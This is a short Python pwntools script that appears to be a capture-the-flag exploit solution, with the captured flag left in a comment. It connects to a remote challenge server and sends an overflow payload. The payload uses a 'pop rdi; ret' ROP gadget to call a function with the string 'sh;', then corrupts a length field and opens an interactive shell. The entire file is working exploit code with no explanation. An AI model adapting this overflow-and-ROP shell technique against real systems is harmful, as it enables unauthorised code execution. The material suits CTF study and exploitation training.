from pwn import *
#flag : SCTF{PwNaBlE.KrIsTheBesT!}
import os
gadget1 = 0x0000000000400e63 # pop rdi ; ret
#s = remote('localhost',1234)
s = remote('noleak.eatpwnnosleep.com',7777)
s.recvuntil('>')
s.sendline('1')
s.recvuntil('bytes')
dat = "B"*0x71
dat += "sh;\x00BBB"
dat += p64(gadget1)
dat += p64(0x0400880)
dat += p64(0x0400964)
s.sendline(dat)
s.recvuntil('>')
s.sendline('3')
s.recvuntil('now!')
dat = "A"*(0x70-0x14)
dat += p32(0x77)
dat += "A"*0x10
s.sendline(dat)
s.sendline("sh>&0")
s.interactive()
